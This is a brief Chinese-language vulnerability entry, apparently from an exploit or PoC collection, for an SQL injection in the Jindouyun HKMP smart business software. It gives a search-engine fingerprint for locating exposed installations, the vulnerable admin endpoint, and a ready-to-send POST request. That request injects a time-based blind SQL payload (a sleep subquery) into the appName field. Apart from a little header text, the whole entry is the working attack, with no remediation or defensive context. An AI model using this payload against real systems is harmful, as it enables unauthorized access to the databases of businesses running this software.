# 金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞

金斗云HKMP智慧商业软件 ｜ SQL注入 ｜ —
- **指纹**：`body="金斗云 Copyright"`
- **请求**：`POST /admin/configApp/queryPrintTemplate HTTP/1.1`

**Payload**
```
Gecko) Chrome/119.0.6045.159 Safari/537.36
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/json
{"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appNam
e":" 悟 空 POS Win 版 ' AND (SELECt 5 from (select(sleep(2)))x) and
'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":362
1722933,"sign":"hkmp","timestamp":1719306504}
```
- **响应特征**：200